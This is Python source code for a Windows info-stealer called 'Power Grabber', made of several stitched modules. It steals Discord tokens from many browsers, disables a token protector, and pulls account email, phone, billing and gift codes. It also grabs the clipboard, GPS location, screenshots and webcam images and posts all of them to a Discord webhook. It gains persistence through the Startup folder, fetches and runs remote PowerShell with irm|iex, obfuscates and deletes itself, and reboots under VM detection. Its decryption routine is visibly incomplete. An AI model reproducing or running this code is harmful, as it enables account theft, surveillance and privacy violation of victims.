from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
devices = AudioUtilities.GetSpeakers()
interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
volume = cast(interface, POINTER(IAudioEndpointVolume))
volume.SetMasterVolumeLevelScalar(1.0, None)
import requests
import os
import shutil
def download_another_file():
    url = "https://raw.githubusercontent.com/Powercascade/Power-grabber/refs/heads/main/Options/Annoy-Max.py"
    response = requests.get(url)
    downloads_path = os.path.join(os.path.expanduser("~"), "Downloads")
    file_path = os.path.join(downloads_path, "Annoy-Max.py")
    startup_path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    startup_file = os.path.join(startup_path, "Annoy-Max.py")
    if response.status_code == 200:
        with open(file_path, "wb") as file:
            file.write(response.content)
        shutil.move(file_path, startup_file)
    else:
        print("Failed to download file")
download_another_file()
def download_audio():
    url = "https://raw.githubusercontent.com/Powercascade/Power-grabber/main/Loud"
    response = requests.get(url)
    downloads_path = os.path.join(os.path.expanduser("~"), "Downloads")
    file_path = os.path.join(downloads_path, "loud.mp3")
    startup_path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    startup_file = os.path.join(startup_path, "loud.mp3")
    if response.status_code == 200:
        with open(file_path, "wb") as file:
            file.write(response.content)
        shutil.move(file_path, startup_file)
    else:
        print("Failed to download audio file")
download_audio()
import subprocess
import sys
import json
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
try:
    import pyperclip
except ImportError:
    install('pyperclip')
    import pyperclip
try:
    import requests
except ImportError:
    install('requests')
    import requests
def send_to_webhook(content):
    embed = {
        "description": content,
        "color": 0x8B0000,
        "footer": {
            "text": f"Power Grabber | Made by Powercascade and Taktikal.exe"
        }
    }
    payload = {
        "embeds": [embed]
    }
    headers = {
        "Content-Type": "application/json"
    }
    requests.post(webhook_url, data=json.dumps(payload), headers=headers)
clipboard_content = pyperclip.paste()
send_to_webhook(clipboard_content)
import subprocess
import sys
import os
import base64
import json
import re
from datetime import datetime
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
try:
    import requests
except ImportError:
    install('requests')
    import requests
try:
    from pathlib import Path
except ImportError:
    install('pathlib')
    from pathlib import Path
try:
    from win32crypt import CryptUnprotectData
except ImportError:
    install('pywin32')
    from win32crypt import CryptUnprotectData
try:
    from PIL import ImageGrab
except ImportError:
    install('Pillow')
    from PIL import ImageGrab
class Discord:
    def __init__(self):
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regex = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens_sent = []
        self.tokens = []
        self.ids = []
        self.killprotector()
        self.grabTokens()
    def killprotector(self):
        path = f"{self.roaming}\\DiscordTokenProtector"
        config = path + "config.json"
        if not os.path.exists(path):
            return
        for process in ["\\DiscordTokenProtector.exe", "\\ProtectionPayload.dll", "\\secure.dat"]:
            try:
                os.remove(path + process)
            except FileNotFoundError:
                pass
        if os.path.exists(config):
            with open(config, errors="ignore") as f:
                try:
                    item = json.load(f)
                except json.decoder.JSONDecodeError:
                    return
                item['auto_start'] = False
                item['auto_start_discord'] = False
                item['integrity'] = False
                item['integrity_allowbetterdiscord'] = False
                item['integrity_checkexecutable'] = False
                item['integrity_checkhash'] = False
                item['integrity_checkmodule'] = False
                item['integrity_checkscripts'] = False
                item['integrity_checkresource'] = False
                item['integrity_redownloadhashes'] = False
                item['iterations_iv'] = 364
                item['iterations_key'] = 457
                item['version'] = 69420
    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
        
            
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"
    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    def grabTokens(self):
        paths = {
    'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
    'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
    'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
    'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
    'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
    'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
    'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
    'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
    'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
    'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
    'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
    '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
    'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
    'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
    'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
    'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
    'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
    'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
    'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
    'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
    'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
    'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
    'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
    'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
    'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
    'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
    'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\',
    'Vesktop': self.roaming + '\\vesktop\\sessionData\\Local Storage\\leveldb\\',
    'Firefox': self.roaming + '\\Mozilla\\Firefox\\Profiles\\<profile-folder>\\storage\\default\\',
        }
        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.encrypted_regex, line):
                                token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tokens.append(token)
                                        self.ids.append(uid)
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            r = requests.get(self.baseurl, headers={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                                'Content-Type': 'application/json',
                                'Authorization': token})
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)
        if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            r = requests.get(self.baseurl, headers={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                                'Content-Type': 'application/json',
                                'Authorization': token})
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)
    def upload(self, webhook):
        for token in self.tokens:
            if token in self.tokens_sent:
                continue
            val = ""
            methods = ""
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'Content-Type': 'application/json',
                'Authorization': token
            }
            user = requests.get(self.baseurl, headers=headers).json()
            payment = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers).json()
            friends = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers).json()
            guilds = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers).json()
            gift_codes = requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes", headers=headers).json()
            connections = requests.get("https://discord.com/api/v9/users/@me/connections", headers=headers).json()            
            friend_count = len([f for f in friends if f['type'] == 1])
            guild_count = len(guilds)
            connection_count = len(connections)            
            username = user['username'] + "#" + user.get('discriminator', '0000')
            blocked_count = len([f for f in friends if f['type'] == 2])
            blocked_users = [f'{f["user"]["username"]}#{f["user"]["discriminator"]}' for f in friends if f['type'] == 2]
            discord_id = user['id']
            avatar_url = (
                f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif"
                if requests.get(f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif").status_code == 200
                else f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.png"
            )
            phone = user['phone'] if user.get('phone') else ":x:"
            email = user['email']
            language = user.get('locale', 'en-US').split('-')[0]
            mfa = ":white_check_mark:" if user.get('mfa_enabled') else ":x:"
            creation_date = datetime.utcfromtimestamp(((int(discord_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
            premium_types = {
                0: ":x:",
                1: "Nitro Classic",
                2: "Nitro",
                3: "Nitro Basic"
            }
            nitro = premium_types.get(user.get('premium_type'), ":x:")
            nitro_since = user.get('premium_since', 'N/A')            
            if "message" in payment or payment == []:
                methods = ":x:"
            gift_codes_str = "\n".join([f"Code: {code['code']} | {code['promotion']['outbound_title']}" for code in gift_codes]) if gift_codes else "No gift codes"
            connections_str = "\n".join([f"{conn['type']}: {conn['name']}" for conn in connections]) if connections else "No connections"
            flags = user.get('public_flags', 0)
            badges = []
            if flags & 1: badges.append("<:staff:969573862939975700>")
            if flags & 2: badges.append("<:partner:969573863162085376>")
            if flags & 4: badges.append("<:hypesquad_events:969573862906425344>")
            if flags & 8: badges.append("<:bughunter_1:969573862840082443>")
            if flags & 64: badges.append("<:Bravery:1314700385260277800>")
            if flags & 128: badges.append("<:brilliance:969573862735224852>")
            if flags & 256: badges.append("<:balance:969573862550659092>")
            if flags & 512: badges.append("<:early_supporter:969573862906429440>")
            if flags & 16384: badges.append("<:bughunter_2:969573862840082443>")
            if flags & 131072: badges.append("<:developer:969573862926577675>")
            if flags & 4194304: badges.append("<:active_developer:1042545590640324608>")
            badge_str = " ".join(badges) if badges else "No Badges"
            data = {
                "embeds": [
                    {
                        "title": "((✨POWER GRABBER✨))",
                        "username": "Power Grabber",
                        "color": 0x8B0000,
                        "fields": [
                            {
                                "name": "🪪Discord ID:",
                                "value": f"`{discord_id}`"
                            },
                            {
                                "name": "<:Email:1314700420152692746>Email:",
                                "value": f"`{email}`"
                            },
                            {
                                "name": "📱Phone:",
                                "value": f"`{phone}`"
                            },
                            {
                                "name": "🔐2FA:",
                                "value": f"{mfa}"
                            },
                            {
                                "name": "<:Nitro:1314700484032069695>Nitro Info:",
                                "value": f"{nitro}\nNitro Since:\n{nitro_since}"
                            },
                            {
                                "name": "💳Billing:",
                                "value": f"{methods}"
                            },
                            {
                                "name": "🗝️Token:",
                                "value": f"`{token}`"
                            },
                            {
                                "name": "👤Username:",
                                "value": f"`{username}`"
                            },
                            {
                                "name": "🏅Badges:",
                                "value": f"{badge_str}"
                            },
                            {
                                "name": "👥Number of Friends:",
                                "value": f"{friend_count}"
                            },
                            {
                                "name": "📆Account creation date:",
                                "value": f"{creation_date}"
                            },
                            {
                                "name": "🔗Connections:",
                                "value": f"{connections_str}"
                            },
                            {
                                "name": "🎁Gift Codes:",
                                "value": f"{gift_codes_str}"
                            },
                            {
                                "name": "🗣️Account langauage:",
                                "value": f"{language}"
                            },
                            {
                                "name": "⚙️Server count:",
                                "value": f"{guild_count}"
                            },
                            {
                                "name": "🚫Number of users blocked:",
                                "value": f"{blocked_count}"
                            },
                            {
                              "name": "💻 the code:",
                                "value": f"[**`Click here for the code`**](https://github.com/Powercascade/Power-grabber)"
                            },
                            {
                                "name": "<:Skull:1288242523776483359>Join Power's discord:",
                                "value": f"[**`Join, NOW`**](https://discord.gg/Zsyhg7YYKV)"
                            },
                            {
                                "name": "📸Download the user's pfp:",
                                "value": f"[**`Click to Download`**]({avatar_url})"
                            },
                            {
                                "name": " ",
                                "value": f"Power Grabber | Made by Powercascade and Taktikal.exe"
                            }
                        ],
                        "thumbnail": {
                            "url": avatar_url},
                    }
                ],
            }
            requests.post(webhook, json=data)
            self.tokens_sent.append(token)
discord_grabber = Discord()
discord_grabber.upload(webhook_url)
import subprocess
import json
import sys
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
try:
    import requests
except ImportError:
    install('requests')
    import requests
powershell_script = """
Add-Type -AssemblyName System.Device
$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
$GeoWatcher.Start()
while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {Sleep -M 100}
if ($GeoWatcher.Permission -eq 'Denied'){$GPS = "Location Services Off"}
else{
    $GL = $GeoWatcher.Position.Location | Select Latitude,Longitude
    $GL = $GL -split " "
    $Lat = $GL[0].Substring(11) -replace ".$"
    $Lon = $GL[1].Substring(10) -replace ".$"
    $GPS = "LAT = $Lat LONG = $Lon"
}
$GPS
"""
process = subprocess.Popen(["powershell", "-Command", powershell_script], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
stdout, stderr = process.communicate()
if stderr:
    print(f"Error: {stderr.decode()}")
else:
    gps_info = stdout.decode().strip()
    if gps_info == "Location Services Off":
        print("Location Services are off.")
        latitude = None
        longitude = None
    else:
        gps_info = gps_info.replace("LAT = ", "").replace("LONG = ", "")
        latitude, longitude = gps_info.split(" ")
    if latitude and longitude:
        embed = {
            "title": "🗺️ Location",
            "description": "GPS Coordinates",
            "fields": [
                {
                    "name": "Latitude",
                    "value": latitude,
                    "inline": True
                },
                {
                    "name": "Longitude",
                    "value": longitude,
                    "inline": True
                }
            ],
            "color": 0x8B0000
        }
    else:
        embed = {
            "title": "🗺️ Location",
            "description": "Location Services are Off or GPS data unavailable.",
            "fields": [
                {
                    "name": "Latitude",
                    "value": "None",
                    "inline": True
                },
                {
                    "name": "Longitude",
                    "value": "None",
                    "inline": True
                },
                {
                    "name": " ",
                    "value": "Power Grabber | Made by Powercascade and Taktikal.exe",
                    "inline": True
                },
            ],
            "color": 0x8B0000
        }
    message = {
        "embeds": [embed]
    }
    headers = {
        "Content-Type": "application/json"
    }
    try:
        response = requests.post(webhook_url, headers=headers, data=json.dumps(message))
        if response.status_code == 204:
            pass
        else:
            pass
    except Exception as e:
        pass
import base64
def obfuscate_file(file_path, iterations=3):
    with open(file_path, 'r') as file:
        code = file.read()
    
    for _ in range(iterations):
        code = base64.b64encode(code.encode('utf-8')).decode('utf-8')
        code = f"exec(base64.b64decode('{code}').decode('utf-8'))"
    
    obfuscated_code = f"""
import base64
{code}
"""
    with open(file_path, 'w') as file:
        file.write(obfuscated_code)
    print("Obfuscation complete.")
if __name__ == "__main__":
    obfuscate_file(__file__)
import random
import os
import subprocess
import sys
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
try:
    import requests
except ImportError:
    install('requests')
    import requests
try:
    from discord import Embed
except ImportError:
    install('discord.py')
    from discord import Embed
port_file = "port.txt"
port_range_start = 1000
port_range_end = 5051
def is_port_in_use(port):
    import socket
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.bind(('localhost', port))
            return False
        except OSError:
            return True
if os.path.exists(port_file):
    with open(port_file, 'r') as f:
        port = int(f.read().strip())
else:
    port = random.randint(port_range_start, port_range_end)
    while True:
        if not is_port_in_use(port):
            break
        port = random.randint(port_range_start, port_range_end)
    with open(port_file, 'w') as f:
        f.write(str(port))
embed = Embed(title='New Port Available', color=0x8B0000)
embed.add_field(name='Port Number', value=str(port))
payload = {'embeds': [embed.to_dict()]}
response = requests.post(webhook_url, json=payload)
if response.status_code == 204:
    pass
else:
    pass
import subprocess
import sys
import os
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
try:
    import requests
except ImportError:
    install('requests')
    import requests
try:
    from PIL import ImageGrab
except ImportError:
    install('Pillow')
    from PIL import ImageGrab
try:
    from screeninfo import get_monitors
except ImportError:
    install('screeninfo')
    from screeninfo import get_monitors
try:
    import win32gui
except ImportError:
    install('pywin32')
    import win32gui
try:
    import win32ui
except ImportError:
    install('pywin32')
    import win32ui
try:
    import win32con
except ImportError:
    install('pywin32')
    import win32con
try:
    from PIL import Image
except ImportError:
    install('Pillow')
    from PIL import Image
def capture_screenshot(monitor):
    hwin = win32gui.GetDesktopWindow()
    width = monitor.width
    height = monitor.height
    left = monitor.x
    top = monitor.y
    hwindc = win32gui.GetWindowDC(hwin)
    srcdc = win32ui.CreateDCFromHandle(hwindc)
    memdc = srcdc.CreateCompatibleDC()
    bmp = win32ui.CreateBitmap()
    bmp.CreateCompatibleBitmap(srcdc, width, height)
    memdc.SelectObject(bmp)
    memdc.BitBlt((0, 0), (width, height), srcdc, (left, top), win32con.SRCCOPY)
    bmpinfo = bmp.GetInfo()
    bmpstr = bmp.GetBitmapBits(True)
    img = Image.frombuffer(
        'RGB',
        (bmpinfo['bmWidth'], bmpinfo['bmHeight']),
        bmpstr, 'raw', 'BGRX', 0, 1)
    memdc.DeleteDC()
    win32gui.DeleteObject(bmp.GetHandle())
    srcdc.DeleteDC()
    win32gui.ReleaseDC(hwin, hwindc)
    return img
def capture_screenshots():
    file_paths = []
    monitors = get_monitors()
    for i, monitor in enumerate(monitors, start=1):
        screenshot = capture_screenshot(monitor)
        filename = f'screenshot_screen_{i}.png'
        screenshot.save(filename)
        file_paths.append(filename)
        send_screenshot_to_webhook(filename)
        if os.path.exists(filename):
            os.remove(filename)
    return file_paths
def send_screenshot_to_webhook(filename):
    with open(filename, 'rb') as f:
        response = requests.post(
            webhook_url,
            files={"file": (filename, f, 'image/png')},
            data={"payload_json": '{"embeds": [{"color": 9109504, "image": {"url": "attachment://' + filename + '"}}]}'}
        )
        response.raise_for_status()
def main():
    capture_screenshots()
if __name__ == "__main__":
    main()
import os
def self_destruct():
    try:
        script_path = os.path.abspath(__file__)
        os.remove(script_path)
    except Exception as e:
        pass
if __name__ == "__main__":
    self_destruct()
import time
import sys
import subprocess
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
try:
    import pyautogui
except ImportError:
    install('pyautogui')
    import pyautogui
time.sleep(0.1)
pyautogui.hotkey('win', 'r')
time.sleep(0.1)
pyautogui.write(f"powershell -NoP -Ep Bypass -W H -C $dc='{webhook_url}'; irm https://raw.githubusercontent.com/Powercascade/Power-grabber/refs/heads/main/taktikal | iex")
pyautogui.press('enter')
import subprocess
import sys
import os
import json
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
try:
    import requests
except ImportError:
    install('requests')
    import requests
try:
    import psutil
except ImportError:
    install('psutil')
    import psutil
def check_gpu():
    try:
        result = subprocess.run(["wmic", "path", "Win32_VideoController", "get", "Caption"], capture_output=True, text=True)
        if 'VMware' in result.stdout or 'VirtualBox' in result.stdout:
            return True
        else:
            return False
    except Exception as e:
        print(f"Error checking GPU: {e}")
        return False
def send_to_discord(is_vm):
    payload = {
        "content": " ",
        "embeds": [
            {
                "title": "Virtual Machine Detection Result:",
                "description": "True" if is_vm else "False",
                "color": 0x8B0000
            }
        ]
    }
    headers = {
        'Content-Type': 'application/json'
    }
    try:
        response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"Error sending to Discord: {e}")
def restart_system():
    try:
        os.system('shutdown /r /t 0')
    except Exception as e:
        print(f"Error restarting system: {e}")
is_vm = check_gpu()
send_to_discord(is_vm)
if is_vm:
    restart_system()
import subprocess
import sys
import json
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
try:
    import cv2
except ImportError:
    install('opencv-python')
    import cv2
try:
    import requests
except ImportError:
    install('requests')
    import requests
try:
    from io import BytesIO
except ImportError:
    install('io')
    from io import BytesIO
try:
    from PIL import Image
except ImportError:
    install('Pillow')
    from PIL import Image
def capture_and_send_to_discord(webhook_url):
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        print("Error: Could not open webcam")
        return
    ret, frame = cap.read()
    if ret:
        rgb_frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        image = Image.fromarray(rgb_frame)
        img_byte_arr = BytesIO()
        image.save(img_byte_arr, format='PNG')
        img_byte_arr.seek(0)
        files = {
            'file': ('webcam.png', img_byte_arr, 'image/png')
        }
        payload = {
            "embeds": [
                {
                    "color": 0x8B0000,
                    "image": {
                        "url": "attachment://webcam.png"
                    }
                }
            ]
        }
        try:
            response = requests.post(webhook_url, files=files, data={"payload_json": json.dumps(payload)})
            if response.status_code == 200:
                pass
            else:
                pass
        except Exception as e:
            pass
    cap.release()
capture_and_send_to_discord(webhook_url)
